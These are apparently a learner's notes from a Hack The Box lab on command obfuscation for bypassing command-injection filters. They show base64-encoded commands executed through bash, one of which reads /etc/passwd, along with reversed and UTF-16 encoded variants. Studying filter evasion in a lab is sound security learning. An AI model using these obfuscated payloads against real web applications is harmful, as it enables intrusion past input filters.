...
***
###### `Title :- Advance Command Obfuscation`
###### `Created on :- 2023-07-16 - 11:03`
###### `Created by:- Prem J`
***
...
>[!Exercise]
>Can you test the above command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?
...
```shell-session
premjampuram@htb[/htb]$ echo 'whoami' | rev
imaohw
```
...
```shell-session
premjampuram@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
...
```shell-session
premjampuram@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

![[Screenshot from 2023-07-17 07-30-13.png]]
...
```shell-session
premjampuram@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
